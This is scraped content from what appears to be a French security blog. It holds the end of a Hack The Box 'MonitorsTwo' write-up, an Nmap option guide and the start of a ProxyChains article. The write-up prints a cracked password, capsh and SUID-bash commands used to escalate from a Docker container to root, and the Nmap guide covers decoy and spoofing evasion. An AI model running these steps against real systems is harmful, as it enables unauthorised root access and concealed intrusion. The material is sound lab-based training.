moins de 10min nous obtenons un résultat pour l\u0026rsquo;utilisateur marcus :\n┌──(raizen㉿Raizen)-[~] └─$ hashcat -m 3200 --username --show hashes marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey We can now use these creds, marcus:funkymonkey, for logging into SSH:\n┌──(raizen㉿Raizen)-[~] └─$ ssh marcus@10.10.11.211 marcus@10.10.11.211\u0026#39;s password: \u0026lt;SNIP\u0026gt; You have mail. Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40 ┌──(marcus㉿monitorstwo)-[~] └─$ Élevation de privilèges #\rNous pouvons maintenant utiliser ces identifiants marcus:funkymonkey pour nous connecter via SSH :\n┌──(marcus㉿monitorstwo)-[~] └─$ cat user.txt \u0026lt;********************************\u0026gt; À ce niveau nous retournons donc comme la première fois dans le dossier /var/mail/ où nous trouverons le mail de l\u0026rsquo;admin destiné aux utilisateurs du système et faisant mention de trois CVE, dont seul le dernier concernant une version de contenant vulnérable sera exploitable dans notre cas:\n┌──(marcus㉿monitorstwo)-[~] └─$ cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all,... La description de la vulnérabilité fait référence aux répertoires sous /var/lib/docker/, donc nous ne sommes intéressés que par ceux-ci.\n# Listage des conteneurs Docker ┌──(marcus㉿monitorstwo)-[~] └─$ findmnt TARGET SOURCE FSTYPE OPTIONS \u0026lt;SNIP\u0026gt; │ nsfs rw ├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over ├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm │ shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k ├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over └─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k Nous devons déterminer le conteneur associé à l\u0026rsquo;application Cacti, car notre session de shell conteneurisé se trouve à l\u0026rsquo;intérieur de celui-ci. Nous pouvons le faire en créant un fichier depuis notre session de shell conteneurisé (notre point d\u0026rsquo;entrée initial), puis vérifier si ce fichier est disponible depuis l\u0026rsquo;extérieur du conteneur avec marcus.\n# Déplaçons nous vers le répertoire /tmp et créons un fichier test www-data@50bca5e748b0:/var/www/html$ cd /tmp www-data@50bca5e748b0:/tmp$ touch test Les contenus les plus lourds sont généralement des images, et si le pilote de stockage par défaut overlay2 est utilisé, alors ces images Docker sont stockées dans /var/lib/docker/overlay2 (freecodecamp). Par conséquent, nous devons juste vérifier 2 des 4 chemins de conteneurs trouvés ci-dessus :\nNous pouvons vérifier chacun de ces 2 conteneurs séquentiellement pour voir lequel contient le fichier test :\n┌──(marcus㉿monitorstwo)-[~] └─$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test ls: cannot access \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test\u0026#39;: No such file or directory ┌──(marcus㉿monitorstwo)-[~] └─$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test -rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test Le conteneur Cacti est donc: c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1. Maintenant, nous devons attribuer des permissions SUID à /bin/bash, afin que marcus puisse l\u0026rsquo;exécuter depuis l\u0026rsquo;extérieur et obtenir un shell root. Pour ce faire, nous devons d\u0026rsquo;abord élever nos privilèges à l\u0026rsquo;intérieur du conteneur.\nCelà se fera comme dans la première méthodologie en recherchant les fichiers avec un bit SUID:\nwww-data@50bca5e748b0:/tmp$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su En suivant les instruction d\u0026rsquo;exploitation du binaire /sbin/capsh comme indiqué sur Gtfobins nous obtenons notre accès root:\n#root www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 -- root@50bca5e748b0:/tmp# id uid=0(root) gid=0(root) groups=0(root),33(www-data) Étant root nous pouvons donc assigner le bit SUID au binaire /bin/bash: # assignation de permission SUID root@50bca5e748b0:/tmp# chmod u+s /bin/bash # vérification root@50bca5e748b0:/tmp# ls -l /bin/bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash Enfin, nous pouvons retourner à la session SSH de marcus et exécuter le binaire bash en utilisant l\u0026rsquo;option -p (link)\nflag:\n┌──(marcus㉿monitorstwo)-[~] └─$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 bash ┌──(marcus㉿monitorstwo)-[/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin] └─$ ./bash -p bash-5.1# id uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus) bash-5.1# cat /root/root.txt \u0026lt;********************************\u0026gt; ","date":"16 December 2023","externalUrl":null,"permalink":"/posts/htb-monitorstwo/","section":"Posts","summary":"MonitorsTwo est une machine Linux de difficulté facile. Elle met en avant quelques vulnérabilités et erreurs de configurations qui seront exploitées afin de prendre le contrôle du système suivant la kill-chain\u0026hellip;","title":"MonitorsTwo (HTB)","type":"posts"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/tags/post/","section":"Tags","summary":"","title":"Post","type":"tags"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/","section":"Raizen | Blog","summary":"","title":"Raizen | Blog","type":"page"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/categories/markdown/","section":"Categories","summary":"","title":"Markdown","type":"categories"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/network/","section":"Tags","summary":"","title":"Network","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/network-analysis/","section":"Tags","summary":"","title":"Network Analysis","type":"tags"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/nmap/","section":"Tags","summary":"","title":"Nmap","type":"tags"},{"content":"Dans le domaine du pentesting et des CTF (Capture The Flag), la phase d\u0026rsquo;énumération est une étape cruciale. C\u0026rsquo;est là que l\u0026rsquo;outil Nmap entre en jeu. Nmap, abréviation de Network Mapper, est un outil polyvalent et puissant qui peux se montrer utile autant pour un particulier q\u0026rsquo;un professionnel de la sécurité informatique cherchant à analyser, explorer et sécuriser un réseau.\nQue ce soit pour auditer la sécurité de notre propre réseau, découvrir les dispositifs connectés ou évaluer la sécurité d\u0026rsquo;un réseau distant, Nmap est l\u0026rsquo;outil de prédilection. Grâce à ses fonctionnalités avancées, il permet de cartographier les hôtes du réseau, d\u0026rsquo;identifier les ports ouverts, les services en cours d\u0026rsquo;exécution, et bien plus encore.\nDans ce guide, nous explorerons de manière non-exhaustive mais autant que possible les différentes options d\u0026rsquo;analyse qu\u0026rsquo;offre Nmap et leurs utilités.\nI- Analyse du Réseau #\rAvant de plonger dans les techniques avancées d\u0026rsquo;analyse de ports offertes par Nmap, il est important de comprendre le fonctionnement général de cet outil et à quoi ressemble une commande standard de Nmap, ainsi que ses options par défaut.\nFonctionnement Général de Nmap L\u0026rsquo;outil Nmap fonctionne en envoyant des paquets réseau à la cible et se sert de l\u0026rsquo;analyse des réponses pour déterminer entre autres quels ports sont ouverts, quels services sont en cours d\u0026rsquo;exécution sur ces ports, et quelles sont les adresses IP des hôtes actifs sur le réseau. Il utilise différentes techniques de scan (que nous verront dans la section suivante) pour accomplir ces tâches. Chacune de ces techniques ayant leurs propres utilités, avantages et inconvénients en termes de discrétion, vitesse et détection.\nCommande Standard de Nmap Une commande standard de Nmap suit généralement la structure suivante :\nnmap [options] [cibles]\nLes \u0026ldquo;options\u0026rdquo; permettent de spécifier les paramètres du scan, tels que les techniques de scan à utiliser, les types de ports à scanner, etc. Les \u0026ldquo;cibles\u0026rdquo; sont les adresses IP ou les plages d\u0026rsquo;adresses à scanner.\nII- Techniques de Scans #\rL\u0026rsquo;option -sS exécute un scan SYN, qui ne complète pas la connexion TCP et ne laisse aucune trace, ce qui le rend idéal pour une utilisation discrète, mais nécessite souvent des privilèges.\nAvec -sT, Nmap effectue un scan connecté, complétant la connexion TCP. Bien que cette méthode laisse une trace, elle peut être utilisée en toute sécurité sans privilèges.\nLe scan UDP, activé par -sU, est plus lent car il teste les ports UDP, notamment ceux utilisés par des services comme DNS(port 53), SNMP(port 161/163) et DHCP (port 67/68).\n-sY utilise le protocole SCTP, qui échoue à établir la connexion, évitant ainsi les journaux. Cela fonctionne de manière similaire à ``-PY.\nLes scans Null (-sN), Fin (-sF) et Xmas (-sX) envoient des paquets avec des flags TCP spécifiques pour pénétrer certains pare-feu et extraire des informations.\nLe scan Maimon (-sM) envoie des flags FIN et ACK, principalement pour BSD, mais actuellement, il rapportera tous les ports comme fermés.\nLes scans ACK (-sA) et Window (-sW) sont utilisés pour détecter les pare-feu en examinant la manière dont ils répondent aux paquets.\nLe scan Idle (-sI) est utilisé lorsque nous savons qu\u0026rsquo;un pare-feu ne filtre pas certaines IP, permettant une reconnaissance plus discrète.\nL\u0026rsquo;option --badsum envoie une somme de contrôle incorrecte, ce qui peut provoquer des réponses inattendues des pare-feu.\nLe scan SCTP Weird (-sZ) peut passer à travers des pare-feu, mais ne distingue pas entre les ports filtrés et ouverts.\nLe scan de protocole IP (-sO) envoie des en-têtes mal formés pour analyser les protocoles IP.\nL\u0026rsquo;option -b \u0026lt;server\u0026gt; est utilisée pour scanner un hôte depuis un autre via FTP, mais est peu utile en pratique dans la plupart des cas.\nDécouverte d\u0026rsquo;Équipement #\rLorsque Nmap lance sa phase de découverte, il utilise par défaut une combinaison de techniques pour identifier les équipements actifs sur le réseau, comprenant : -PA80 -PS443 -PE -PP. Ces options sont des spécifications de types de sondes utilisées par défaut par Nmap lors de la phase de découverte des équipements sur le réseau.\nPA80 : Cette option signifie que Nmap envoie des paquets TCP SYN vers le port 80 (HTTP) des hôtes pour tenter d\u0026rsquo;initier une connexion. Le port 80 est souvent utilisé pour les serveurs web.\nPS443 : Cela indique à Nmap d\u0026rsquo;envoyer des paquets TCP SYN vers le port 443 (HTTPS) pour tester la connectivité. Le port 443 est généralement utilisé pour les connexions sécurisées HTTPS.\nPE : Cette option signifie que Nmap envoie des paquets ICMP Echo Request pour tester la connectivité avec les hôtes. Il s\u0026rsquo;agit d\u0026rsquo;une méthode non intrusive de vérification de la disponibilité des hôtes sur le réseau.\nPP : Cela indique à Nmap d\u0026rsquo;envoyer des paquets ICMP Timestamp Request pour vérifier la connectivité avec les hôtes. Il s\u0026rsquo;agit également d\u0026rsquo;une méthode non intrusive de vérification de la disponibilité des hôtes.\nAinsi, en utilisant une combinaison de ces sondes, Nmap peut identifier les équipements actifs sur le réseau et établir une base de données sur laquelle il pourra ensuite effectuer des scans plus approfondis des ports et des services\nsL : Ce scan non intrusif permet de lister les cibles en effectuant des requêtes DNS pour la résolution des noms. C\u0026rsquo;est une approche discrète pour obtenir une liste d\u0026rsquo;équipements actifs.\nPn : En désactivant le ping, cet option indique à Nmap de ne pas effectuer de vérification de la disponibilité des hôtes via le ping. Utile si vous êtes sûr que toutes les cibles sont actives.\nsn : Ce scan ne fait pas de scan de ports après la phase de reconnaissance, ce qui le rend relativement discret et adapté à une découverte rapide du réseau.\nPR : En utilisant le ping ARP, cette option est souvent utilisée par défaut lors de l\u0026rsquo;analyse des ordinateurs dans votre propre réseau local.\n-PM : Effectue un ping ICMP address mask pour vérifier si la cible est active.\nPS \u0026lt;ports\u0026gt; : Envoie des paquets SYN pour tester la connectivité des ports. Les réponses indiquent si le port est ouvert, fermé ou injoignable.\nPA \u0026lt;ports\u0026gt; : Similaire à l\u0026rsquo;option précédente, mais en utilisant des paquets ACK. La combinaison des deux peut donner de meilleurs résultats.\nPU \u0026lt;ports\u0026gt; : Envoie des sondes à des ports censés être fermés, ce qui est utile pour tester les pare-feu.\nPY \u0026lt;ports\u0026gt; : Envoie des sondes SCTP INIT, généralement au port 80(HTTP) par défaut, pour détecter l\u0026rsquo;état ouvert/fermé/inactif des ports.\n-PO \u0026lt;protocols\u0026gt; : Indique les protocoles dans les en-têtes, par défaut ICMP (1), IGMP (2) et Encap IP (4).\nAutres Options :\n-n : Désactive la résolution DNS, ce qui peut accélérer le scan en évitant la résolution de noms d\u0026rsquo;hôtes.\n-R : Force la résolution DNS pour toutes les cibles, garantissant ainsi l\u0026rsquo;affichage des noms d\u0026rsquo;hôtes dans les résultats du scan.\nOptions de Port #\r-p «ports»: Permet de spécifier les ports à scanner. Utilisez cette option suivie de la liste des ports que vous souhaitez scanner. Par exemple, pour scanner tous les ports, vous pouvez utiliser -p- ou -p all.\n-F: Ce paramètre permet de réaliser un scan rapide en ne vérifiant que les 100 ports les plus couramment utilisés.\n--top-ports «nombre»: Cette option vous permet de spécifier le nombre de ports les plus courants à scanner, de 1 à 65335.\n-r: Ce paramètre indique à Nmap de scanner les ports dans un ordre aléatoire, ce qui peut aider à éviter la détection par les systèmes de sécurité.\n--port-ratio \u0026lt;ratio\u0026gt; : Cette option permet d\u0026rsquo;analyser les ports les plus courants en spécifiant un ratio entre 0 et 1. Cela permet de focaliser l\u0026rsquo;analyse sur les ports les plus susceptibles d\u0026rsquo;être ouverts.\nScan de Version (-sV) #\r-sV: L\u0026rsquo;option de scan de version permet à Nmap d\u0026rsquo;identifier les versions des services qui tournent sur les ports ouverts. Vous pouvez régler l\u0026rsquo;intensité de ce scan de 0 à 9, avec 7 comme valeur par défaut.\n--version-intensity «nombre»: Cette option vous permet de régler l\u0026rsquo;intensité du scan de version. Une intensité plus basse lancera uniquement les sondes les plus probables, ce qui réduit le temps de scan, notamment pour les scans UDP.\nDétection d\u0026rsquo;OS (-O) #\r-O: L\u0026rsquo;option -O permet à Nmap de tenter de détecter le système d\u0026rsquo;exploitation des hôtes analysés en analysant diverses caractéristiques des paquets réseau.\n--osscan-limit: Si cette option est activée, Nmap n\u0026rsquo;essaiera pas de prédire l\u0026rsquo;OS si moins de 2 ports (un ouvert, un fermé) sont détectés, ce qui économise du temps de scan.\n--osscan-guess: Cette option améliore la détection d\u0026rsquo;OS en cas d\u0026rsquo;incertitude, en effectuant une analyse plus poussée des réponses réseau.\nScripts #\r--script «nom_fichier» | «catégorie» | «répertoire» | «expression» [,...]: Cette option permet de spécifier les scripts à exécuter pendant le scan. Vous pouvez spécifier un nom de fichier, une catégorie, un répertoire ou une expression. Utilisez -sC ou --script=default pour exécuter les scripts par défaut.\nAuth: Exécute tous les scripts disponibles pour l\u0026rsquo;authentification. Default: Exécute les scripts par défaut de la catégorie. Discovery: Récupère des informations sur la cible. External: Utilise des ressources externes. Intrusive: Utilise des scripts considérés comme intrusifs. Malware: Recherche des connexions ouvertes par des codes malveillants. Safe: Exécute des scripts non intrusifs. Vuln: Découvre les vulnérabilités connues. All: Exécute tous les scripts NSE disponibles. Pour rechercher des scripts:\nnmap --script-help=\u0026quot;http-*\u0026quot;: Scripts commençant par \u0026ldquo;http-\u0026rdquo;. nmap --script-help=\u0026quot;not intrusive\u0026quot;: Tous sauf les intrusifs. nmap --script-help=\u0026quot;default or safe\u0026quot;: Ceux qui sont dans l\u0026rsquo;un ou l\u0026rsquo;autre ou les deux. nmap --script-help=\u0026quot;default and safe\u0026quot;: Ceux qui sont dans les deux. nmap --script-help=\u0026quot;(default or safe or intrusive) and not http-*\u0026quot;. --script-args «n1»=«v1»,«n2»={_«n3»=«v3»},«n4»={_«v4»_,_«v5»}: Permet de spécifier des arguments pour les scripts. Vous pouvez spécifier des valeurs pour des arguments individuels ou des ensembles d\u0026rsquo;arguments.\n--script-args-file «nom_fichier»: Cette option lit les arguments depuis un fichier spécifié, ce qui peut être utile pour des configurations complexes.\n--script-help «nom_fichier» | «catégorie» | «répertoire» | «expression» | all[,...]: Cette option fournit de l\u0026rsquo;aide sur les scripts. Vous pouvez spécifier un nom de fichier, une catégorie, un répertoire, une expression ou simplement all pour obtenir une aide complète.\n--script-trace: Cette option fournit des informations détaillées sur l\u0026rsquo;exécution des scripts, ce qui peut être utile pour le débogage.\n--script-updatedb: Cette option met à jour la base de données des scripts, ce qui peut être nécessaire pour intégrer de nouveaux scripts ou des mises à jour.\nContrôle du Temps #\rNmap peut ajuster le temps en secondes, minutes, ou millisecondes : Vous pouvez définir le temps en utilisant --host-timeout arguments 900000ms, 900, 900s, et 15m qui effectueront tous la même tâche.\n--min-hostgroup «numhosts»; --max-hostgroup «numhosts»: Ces options ajustent la taille des groupes d\u0026rsquo;analyse en parallèle.\n--min-parallelism «numprobes»; --max-parallelism «numprobes»: Ces options contrôlent le nombre de scanneurs en parallèle.\n--min-rtt-timeout «time», --max-rtt-timeout «time», --initial-rtt-timeout «time»: Ces options modifient les délais de temps pour les connexions.\n--max-retries «numtries»: Cette option modifie le nombre de tentatives avant d\u0026rsquo;abandonner.\n--host-timeout «time»: Cette option modifie le temps de scan par hôte.\n--scan-delay «time»; --max-scan-delay «time»: Ces options ajustent le délai entre chaque test.\n--min-rate «number»; --max-rate «number»: Ces options modifient le nombre de paquets envoyés par seconde.\n--defeat-rst-ratelimit: Cette option permet d\u0026rsquo;accélérer le scan en ignorant les limites de réponse RST.\nContrôle de l\u0026rsquo;Aggressivité #\r-T paranoid|sneaky|polite|normal|aggressive|insane: Cette option ajuste l\u0026rsquo;agressivité du scan. -T0 (paranoid): Effectue un seul test à la fois, en attendant 5 minutes entre chaque test. -T1(sneaky) et -T2(polite): Effectue les tests de manière similaire, mais en attendant respectivement 15 secondes et 0,4 secondes entre chaque test. -T3(normal): C\u0026rsquo;est l\u0026rsquo;agressivité par défaut, incluant le parallélisme (équilibrage efficace de la vitesse du scan tout en maintenant une utilisation raisonnable des ressources). -T4(agressive): tilise des paramètres prédéfinis pour un scan relativement rapide tout en évitant une utilisation excessive des ressources réseau. Il s\u0026rsquo;agit d\u0026rsquo;un bon compromis entre vitesse et prudence. -T5(insane): Est considéré comme le niveau le plus agressif, utilisant toutes les ressources disponibles pour effectuer un scan aussi rapide que possible. Il s\u0026rsquo;agit du niveau le plus rapide, mais aussi du plus intrusif et risqué. Firewall/IDS #\r-f: Cette option fragmente les paquets. Par défaut, Nmap fragmente les paquets en morceaux de 8 octets après l\u0026rsquo;en-tête. Pour spécifier une taille de fragment différente, vous pouvez utiliser ..mtu (dans ce cas, n\u0026rsquo;utilisez pas -f). Assurez-vous que le décalage est un multiple de 8. Il est à noter que les scanners de version et les scripts ne prennent pas en charge la fragmentation.\nMasquage d\u0026rsquo;Adresse (-D)\n-D decoy1,decoy2,ME: Nmap envoie des scanners avec d\u0026rsquo;autres adresses IP comme origine pour vous cacher. Si vous ajoutez ME à la liste, Nmap vous positionnera là; il est préférable de mettre 5 ou 6 adresses avant la vôtre pour vous masquer complètement. Vous pouvez générer des adresses IP aléatoires avec RND:«nombre» pour générer «nombre» d\u0026rsquo;adresses IP aléatoires. Celles-ci ne fonctionnent pas avec la détection de versions sans connexion TCP. Si vous êtes dans un réseau, il est préférable d\u0026rsquo;utiliser des adresses IP qui sont actives, sinon il sera très facile de savoir que vous êtes la seule active. Pour utiliser des adresses IP aléatoires : nmap -D RND:10 Ip_cible\nSpécification de l\u0026rsquo;Adresse Source (-S) #\r-S IP: Cette option permet de spécifier l\u0026rsquo;adresse IP source du paquet. Utile lorsque Nmap ne détecte pas automatiquement votre adresse IP ou pour faire croire qu\u0026rsquo;un autre hôte effectue le scan. Sélection de l\u0026rsquo;Interface Réseau (-e) #\r-e «interface»: Cette option permet de choisir l\u0026rsquo;interface réseau à utiliser pour le scan. Notons que certains admin réseaux trouvent plus pratique de laisser de nombreux ports ouverts plutôt que de chercher des solutions alternatives. Ces ports, tels que les ports DNS ou FTP, peuvent présenter des vulnérabilités. Pour explorer ces failles potentielles, Nmap propose les options \u0026ndash;source-port «numéro de port» et -g «numéro de port» (équivalents).\n--data «chaîne hexadécimale»: Cette option permet d\u0026rsquo;envoyer des données sous forme de texte en utilisant le format hexadécimal.\n--data-string «chaîne»: Cette option permet d\u0026rsquo;envoyer des données sous forme de texte normal.\n--data-length «nombre»: Cette option spécifie la longueur des données à envoyer. Nmap envoie uniquement les en-têtes et ajoute un nombre spécifié d\u0026rsquo;octets supplémentaires de manière aléatoire.\n--ip-options: Utilisez cette option pour configurer complètement le paquet IP.\n--packet-trace: Utilisez cette option si vous souhaitez voir les options dans les paquets envoyés et reçus.\n--ttl «valeur»: Cette option permet de spécifier la valeur TTL (Time to Live) pour les paquets.\n--randomize-hosts: Cette option rend l\u0026rsquo;attaque moins évidente en randomisant l\u0026rsquo;ordre des cibles.\n--spoof-mac «adresse MAC, préfixe ou nom de fournisseur»: Utilisez cette option pour changer l\u0026rsquo;adresse MAC utilisée lors du scan. Vous pouvez spécifier une adresse MAC, un préfixe ou le nom d\u0026rsquo;un fournisseur.\n--proxies «liste d'URL de proxy séparées par des virgules»: Utilisez cette option pour utiliser des proxys. Notez que parfois, un proxy ne maintient pas autant de connexions ouvertes que Nmap le souhaite, donc vous devrez peut-être modifier le parallélisme avec --max-parallelism.\n-sP: Utilisez cette option pour découvrir les hôtes dans le réseau avec ARP.\nSorties #\r-oN file : Produit une sortie normale dans le fichier spécifié.\n-oX file : Produit une sortie XML dans le fichier spécifié.\n-oS file : Produit une sortie conçue pour les script kiddies dans le fichier spécifié.\n-oG file : Produit une sortie au format greppable dans le fichier spécifié.\n-oA file : Produit toutes les sorties sauf -oS dans le fichier spécifié.\n-v level : Définit le niveau de verbosité.\n-d level : Définit le niveau de débogage.\n--reason : Affiche la raison de l\u0026rsquo;état de l\u0026rsquo;hôte.\n--stats-every time : Affiche les statistiques à intervalles réguliers.\n--packet-trace : Affiche les paquets envoyés.\n--open : Affiche les ports ouverts et leur état.\n--resume file : Permet de reprendre une analyse à partir d\u0026rsquo;un fichier de reprise.\nDivers #\r-6 : Active la prise en charge d\u0026rsquo;IPv6.\n-A : Équivalent à -O -sV -sC \u0026ndash;traceroute.\nExécution #\rPendant l\u0026rsquo;exécution de Nmap, vous pouvez modifier les options en cours de route :\nv / V : Augmente / diminue le niveau de verbosité.\nd / D : Augmente / diminue le niveau de débogage.\np / P : Active / désactive la traçabilité des paquets.\n? : Affiche une aide interactive.\nVulnscan #\rLes scripts de Nmap Vulnscan examinent les versions des services obtenues dans une base de données hors ligne (téléchargée depuis d\u0026rsquo;autres sources très importantes) et renvoient les vulnérabilités potentielles.\nLes bases de données utilisées sont :\nScipvuldb.csv - http://www.scip.ch/en/?vuldb Cve.csv - http://cve.mitre.org Osvdb.csv - http://www.osvdb.org Securityfocus.csv - http://www.securityfocus.com/bid/ Securitytracker.csv - http://www.securitytracker.com Xforce.csv - http://xforce.iss.net Exploitdb.csv - http://www.exploit-db.com Openvas.csv - http://www.openvas.org Il est également nécessaire de télécharger les paquets des bases de données et de les ajouter à /usr/share/nmap/scripts/vulscan/.\nUtilisation :\nPour tout utiliser : sudo nmap -sV --script=vulscan \u0026lt;HOST\u0026gt; Pour utiliser une base de données spécifique : sudo nmap -sV --script=vulscan --script-args vulscandb=cve.csv \u0026lt;HOST\u0026gt; Accélérer l\u0026rsquo;analyse des services de Nmap x16 #\rSelon cette publication, vous pouvez accélérer l\u0026rsquo;analyse des services Nmap en modifiant toutes les valeurs totalwaitms dans /usr/share/nmap/nmap-service-probes à 300 et tcpwrappedms à 200.\nDe plus, les sondes qui n\u0026rsquo;ont pas de servicewaitms spécifiquement défini utilisent une valeur par défaut de 5000. Par conséquent, nous pouvons soit ajouter des valeurs à chacune des sondes, soit compiler Nmap nous-mêmes et changer la valeur par défaut dans service_scan.h.\nSi vous ne souhaitez pas du tout changer les valeurs totalwaitms et tcpwrappedms dans le fichier /usr/share/nmap/nmap-service-probes, vous pouvez modifier le code d\u0026rsquo;analyse de manière à ce que ces valeurs dans le fichier nmap-service-probes soient complètement ignorées.\nEn conclusion, l\u0026rsquo;utilisation de Nmap offre une gamme très variée d\u0026rsquo;options pour l\u0026rsquo;analyse des réseaux, la détection des services et la détection d\u0026rsquo;éventuelles vulnérabilités. En explorant ses fonctionnalités et en ajustant certains paramètres, il est possible d\u0026rsquo;optimiser l\u0026rsquo;analyse et accélérer le processus de découverte et de sécurisation des réseaux informatiques. Que ce soit pour des besoins de sécurité, de dépannage réseau ou de gestion des actifs, Nmap reste un outil précieux et polyvalent pour les tâches de scanning réseau.\n","date":"23 September 2023","externalUrl":null,"permalink":"/posts/nmap-guide/","section":"Posts","summary":"Nmap, abréviation de \u003cem\u003eNetwork Mapper\u003c/em\u003e, est un outil polyvalent et puissant qui peux se montrer utile autant pour un particulier q\u0026rsquo;un professionnel de la sécurité informatique cherchant à analyser, explorer et sécuriser\u0026hellip;","title":"Nmap Guide","type":"posts"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/proxychains/","section":"Tags","summary":"","title":"Proxychains","type":"tags"},{"content":"Dans le domaine de la cybersécurité et des tests de pénétration (pentesting), l\u0026rsquo;anonymat en ligne est crucial. Les professionnels de la cybersécurité utilisent des outils comme ProxyChains pour masquer leur identité et contourner les restrictions géographiques. ProxyChains permet de rediriger le trafic à travers une série de serveurs proxy, rendant le traçage de l\u0026rsquo;origine du trafic extrêmement difficile. Cet article explore en profondeur l\u0026rsquo;utilisation de ProxyChains, de son installation sur des distributions populaires comme Kali et Ubuntu, à son utilisation sur diverses plateformes, y compris Windows. Nous examinerons également ses différentes applications, allant de la simple confidentialité à des scénarios plus complexes impliquant SSH et Metasploit.\nTable des matières #\rIntroduction à ProxyChains Applications de ProxyChains en Cybersécurité Comparaison entre ProxyChains et ProxyChains-ng Installation de ProxyChains sur Kali Installation de ProxyChains sur Ubuntu Utilisation de ProxyChains Intégration de ProxyChains avec Tor Considérations pour l\u0026rsquo;utilisation de ProxyChains Conclusion Introduction à ProxyChains #\rAvant de plonger dans les détails de ProxyChains, il est important de comprendre le concept de proxy.\nQu\u0026rsquo;est-ce qu\u0026rsquo;un Proxy ? #\rUn proxy est un serveur intermédiaire qui agit comme une passerelle entre un utilisateur et Internet. Par exemple, lorsque vous visitez un site web comme google.com, au lieu d\u0026rsquo;envoyer directement les paquets au serveur de Google, vous les envoyez d\u0026rsquo;abord au proxy, qui les transmet ensuite à Google. Ce mécanisme permet au serveur de destination de voir les informations du proxy plutôt que celles de l\u0026rsquo;utilisateur, offrant ainsi une confidentialité accrue.\nQu\u0026rsquo;est-ce que ProxyChains ? #\rProxyChains améliore ce concept en utilisant plusieurs serveurs proxy en chaîne. Le trafic part de votre machine, passe par plusieurs serveurs proxy avant d\u0026rsquo;atteindre la destination finale, rendant le traçage de votre adresse IP d\u0026rsquo;origine beaucoup plus difficile. ProxyChains supporte l\u0026rsquo;intégration avec Tor, SOCKS et les proxys HTTP, permettant une flexibilité et une sécurité accrues lors de la navigation sur Internet. Il peut également être configuré pour fonctionner avec des applications telles que Nmap et SQLmap.\nApplications de ProxyChains en Cybersécurité #\rProxyChains est souvent utilisé dans le cadre de tests de pénétration ou de red teaming pour masquer l\u0026rsquo;origine du trafic et simuler des accès depuis différentes localisations ou adresses IP. En enchaînant plusieurs proxies, y compris des systèmes compromis, les red teamers peuvent mieux dissimuler leurs mouvements au sein d\u0026rsquo;un réseau, rendant leur détection plus difficile. De plus, il est possible de contourner des pare-feux restrictifs pour accéder à des ressources bloquées.\nComparaison entre ProxyChains et ProxyChains-ng #\rProxyChains-ng, ou \u0026ldquo;next generation\u0026rdquo;, est une version améliorée du projet ProxyChains. Il propose des fonctionnalités avancées et une meilleure compatibilité. ProxyChains-ng est un programme UNIX qui intercepte les fonctions libc liées au réseau dans des programmes liés dynamiquement via une DLL préchargée. Il redirige les connexions via des proxies SOCKS4a/5 ou HTTP et supporte uniquement le protocole TCP.\nInstallation de ProxyChains sur Kali #\rProxyChains-ng est préinstallé sur Kali. Pour vérifier son installation, entrez la commande:\nproxychains4 Installation de ProxyChains sur Ubuntu #\rProxyChains-ng n\u0026rsquo;est pas installé par défaut sur Ubuntu, mais peut être installé en suivant ces étapes :\nMettez à jour vos dépôts 😀 sudo apt update -y 